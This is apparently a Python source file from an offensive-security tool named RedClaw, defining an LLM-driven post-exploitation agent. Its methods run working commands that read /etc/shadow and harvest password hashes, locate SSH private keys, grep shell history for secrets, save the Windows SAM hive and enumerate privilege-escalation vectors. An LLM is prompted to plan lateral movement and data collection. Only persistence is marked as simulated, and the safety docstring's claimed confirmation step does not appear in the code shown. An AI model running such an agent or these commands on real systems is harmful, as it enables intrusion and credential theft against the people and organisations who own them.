"""
RedClaw - Post-Exploitation Agent
Privilege escalation, credential harvesting, persistence
"""

from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum

from ..core.llm_client import RedClawLLM, Message
from ..tools.executor import ToolExecutor


class PrivilegeLevel(Enum):
    NONE = "none"
    USER = "user"
    ADMIN = "admin"
    SYSTEM = "system"
    ROOT = "root"


@dataclass
class Credential:
    """Harvested credential"""
    username: str
    credential_type: str  # password, hash, ticket, key
    value: str
    source: str
    domain: str = ""


@dataclass
class PersistenceMethod:
    """Persistence mechanism"""
    method: str
    location: str
    trigger: str
    installed: bool = False


class PostExploitationAgent:
    """
    Post-Exploitation Agent
    
    Capabilities:
    - Privilege escalation (Linux/Windows)
    - Credential harvesting
    - Persistence mechanisms
    - Lateral movement
    - Data exfiltration (simulation)
    
    SAFETY: All actions are logged and require confirmation
    """
    
    def __init__(
        self,
        llm: RedClawLLM,
        executor: ToolExecutor,
        auto_execute: bool = False
    ):
        self.llm = llm
        self.executor = executor
        self.auto_execute = auto_execute
        self.credentials: List[Credential] = []
        self.privilege_level = PrivilegeLevel.NONE
        self.persistence: List[PersistenceMethod] = []
    
    async def check_privilege(self, target: str) -> PrivilegeLevel:
        """Check current privilege level"""
        result = await self.executor.execute("id || whoami /all")
        output = result.stdout.lower()
        
        if 'root' in output or 'uid=0' in output:
            self.privilege_level = PrivilegeLevel.ROOT
        elif 'administrator' in output or 'system' in output:
            self.privilege_level = PrivilegeLevel.SYSTEM
        elif 'admin' in output:
            self.privilege_level = PrivilegeLevel.ADMIN
        else:
            self.privilege_level = PrivilegeLevel.USER
        
        return self.privilege_level
    
    async def find_privesc_vectors(self, platform: str = "linux") -> List[Dict]:
        """Find privilege escalation vectors"""
        vectors = []
        
        if platform == "linux":
            # SUID binaries
            result = await self.executor.execute(
                "find / -perm -4000 -type f 2>/dev/null | head -20"
            )
            if result.stdout:
                vectors.append({
                    "type": "suid",
                    "items": result.stdout.strip().split('\n'),
                    "risk": "high"
                })
            
            # Writable /etc/passwd
            result = await self.executor.execute("ls -la /etc/passwd")
            if 'w' in result.stdout:
                vectors.append({
                    "type": "writable_passwd",
                    "items": ["/etc/passwd"],
                    "risk": "critical"
                })
            
            # Sudo rights
            result = await self.executor.execute("sudo -l 2>/dev/null")
            if result.stdout and 'NOPASSWD' in result.stdout:
                vectors.append({
                    "type": "sudo",
                    "items": result.stdout.strip().split('\n'),
                    "risk": "critical"
                })
            
            # Kernel exploits
            result = await self.executor.execute("uname -r")
            vectors.append({
                "type": "kernel",
                "items": [result.stdout.strip()],
                "risk": "medium"
            })
        
        else:  # Windows
            # Run SharpUp or winPEAS equivalent checks
            result = await self.executor.execute(
                "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul"
            )
            if "0x1" in result.stdout:
                vectors.append({
                    "type": "always_install_elevated",
                    "items": ["AlwaysInstallElevated enabled"],
                    "risk": "critical"
                })
        
        return vectors
    
    async def extract_credentials(self, platform: str = "linux") -> List[Credential]:
        """Extract credentials from system"""
        if platform == "linux":
            # Shadow file (if root)
            result = await self.executor.execute("cat /etc/shadow 2>/dev/null")
            if result.stdout and ':' in result.stdout:
                for line in result.stdout.split('\n'):
                    parts = line.split(':')
                    if len(parts) >= 2 and parts[1] not in ['*', '!', '']:
                        cred = Credential(
                            username=parts[0],
                            credential_type="hash",
                            value=parts[1],
                            source="/etc/shadow"
                        )
                        self.credentials.append(cred)
            
            # SSH keys
            result = await self.executor.execute(
                "find /home -name 'id_rsa' -o -name '*.pem' 2>/dev/null"
            )
            for key_file in result.stdout.strip().split('\n'):
                if key_file:
                    cred = Credential(
                        username="unknown",
                        credential_type="key",
                        value=key_file,
                        source="filesystem"
                    )
                    self.credentials.append(cred)
            
            # History files
            result = await self.executor.execute(
                "cat /home/*/.bash_history 2>/dev/null | grep -i 'pass\\|secret\\|token' | head -10"
            )
            if result.stdout:
                cred = Credential(
                    username="various",
                    credential_type="password",
                    value="Found in bash_history",
                    source=".bash_history"
                )
                self.credentials.append(cred)
        
        else:  # Windows
            # SAM dump (simulated - would need Mimikatz)
            result = await self.executor.execute(
                "reg save HKLM\\SAM sam.bak 2>nul && echo SAM saved"
            )
        
        return self.credentials
    
    async def setup_persistence(
        self,
        method: str,
        payload_path: str
    ) -> PersistenceMethod:
        """Setup persistence mechanism (SIMULATION ONLY)"""
        persistence = PersistenceMethod(
            method=method,
            location=payload_path,
            trigger="boot",
            installed=False  # Never actually install
        )
        
        # Log what would be done
        messages = [
            Message(role="system", content="Explain how this persistence method works:"),
            Message(role="user", content=f"Method: {method}\nPayload: {payload_path}")
        ]
        
        response = self.llm.chat(messages, max_tokens=300)
        persistence.installed = False  # Safety: never actually install
        
        self.persistence.append(persistence)
        return persistence
    
    async def analyze_post_exploitation(
        self,
        platform: str = "linux"
    ) -> Dict[str, Any]:
        """Full post-exploitation analysis"""
        # Check privileges
        priv = await self.check_privilege("")
        
        # Find escalation vectors
        vectors = await self.find_privesc_vectors(platform)
        
        # Extract credentials
        creds = await self.extract_credentials(platform)
        
        # LLM analysis
        messages = [
            Message(role="system", content="""Analyze post-exploitation status:
1. Recommend next steps based on current privileges
2. Prioritize privilege escalation if needed
3. Identify lateral movement opportunities
4. Suggest data collection priorities"""),
            Message(role="user", content=f"""
Current privilege: {priv.value}
Escalation vectors: {len(vectors)} found
Credentials found: {len(creds)}
Platform: {platform}
""")
        ]
        
        response = self.llm.chat(messages, max_tokens=1000)
        
        return {
            "privilege_level": priv.value,
            "escalation_vectors": vectors,
            "credentials_found": len(creds),
            "credential_types": list(set([c.credential_type for c in creds])),
            "analysis": response.content
        }
